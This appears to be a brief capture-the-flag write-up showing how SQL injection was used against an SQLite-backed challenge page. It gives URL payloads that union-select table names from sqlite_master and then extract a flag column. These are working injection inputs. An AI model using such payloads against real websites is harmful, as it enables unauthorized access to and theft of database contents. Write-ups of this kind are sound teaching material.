If you type a single quote in a url, you will see that dbms is sqlite.<br>
So let's try to fetch table names:
<pre>
../?id=0 union select 123, name from sqlite_master
</pre>
The output is:
<pre>
aatroll
</pre>
I doubt that there is a flag. Let's check for more tables:
<pre>
../?id=0 union select 123, name from sqlite_master where name != 'aatroll'
</pre>
And we get
<pre>
ajklshfajks
</pre>
I don't know how to check columns in sqlite so i just typed this and it worked for me:
<pre>
../?id=0 union select 123, flag from ajklshfajks
</pre>
GL